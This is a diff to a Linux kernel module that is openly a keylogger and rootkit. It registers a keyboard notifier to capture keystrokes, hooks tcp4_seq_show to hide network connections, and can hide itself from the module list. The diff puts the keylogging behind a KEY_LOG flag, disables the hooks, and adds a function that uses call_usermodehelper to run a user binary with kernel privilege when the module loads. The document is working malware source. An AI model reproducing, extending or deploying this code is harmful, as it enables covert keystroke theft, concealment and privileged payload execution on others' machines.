@@ -32,7 +32,7 @@ unsigned major;
 #endif
 static char input_buf[BUFLEN];
 unsigned buf_count = 0;
-
+#ifdef KEY_LOG
 static int kl_notifier_call(struct notifier_block *, unsigned long, void *);
 static ssize_t kl_device_read(struct file *, char __user *, size_t, loff_t *);
 
@@ -40,7 +40,7 @@ static struct notifier_block kl_notifier_block = { .notifier_call =
 							   kl_notifier_call };
 
 static struct file_operations fops = { .read = kl_device_read };
-
+#endif
 
 static unsigned long * __force_order;
 
@@ -70,6 +70,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 	return ret;
 }
 
+#ifdef KEY_LOG
 static int kl_notifier_call(struct notifier_block *nb, unsigned long action,
 			    void *data)
 {
@@ -113,6 +114,7 @@ static ssize_t kl_device_read(struct file *fp, char __user *buf, size_t len,
 
 	return buflen;
 }
+#endif
 
 #ifdef HIDE_MODULE
 /* Add this LKM back to the loaded module list, at the point
@@ -162,10 +164,30 @@ static struct ftrace_hook hooks[] = {
 	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
 };
 
+static int spawnProcess(void) {
+
+	int rc;
+
+	static char *envp[] = {
+		"SHELL=/bin/bash",
+		"HOME=/home/spencer",
+		"USER=spencer",
+		"PATH=/home/spencer/bin:/home/spencer/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/home/spencer",
+		"PWD=/home/spencer", 
+		NULL};
+
+	char *argv[] = {"/home/spencer/mySample", NULL};
+
+	rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+	printk("RC is: %i \n", rc);
+	return rc;
+}
+
 static int __init kl_init(void)
 {
+	// int err;
+	#ifdef KEY_LOG
 	int ret;
-	int err;
 	ret = register_chrdev(0, DEVICE_NAME, &fops);
 	if (ret < 0) {
 		printk(KERN_ERR
@@ -174,17 +196,24 @@ static int __init kl_init(void)
 	}
 	major = ret;
 	printk(KERN_INFO "keylog: Registered device major number %u\n", major);
+	#endif
 	protect_memory();
+	#ifdef KEY_LOG
 	ret = register_keyboard_notifier(&kl_notifier_block);
-	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
-	if(err)
-		return err;
+	#endif
+	// err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+	// if(err)
+	// 	return err;
 	unprotect_memory();
+	#ifdef KEY_LOG
 	if (ret) {
 		printk(KERN_ERR
 		       "keylog: Unable to register keyboard notifier\n");
 		return -ret;
 	}
+	#endif
+	int i = spawnProcess();
+    printk(KERN_INFO "keylog: return value %d\n",i);
 
 	memset(input_buf, 0, BUFLEN);
 
@@ -199,9 +228,11 @@ static int __init kl_init(void)
 static void __exit kl_exit(void)
 {
 	protect_memory();
+	#ifdef KEY_LOG
 	unregister_chrdev(major, DEVICE_NAME);
 	unregister_keyboard_notifier(&kl_notifier_block);
-	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+	#endif
+	// fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	unprotect_memory();
 }
 
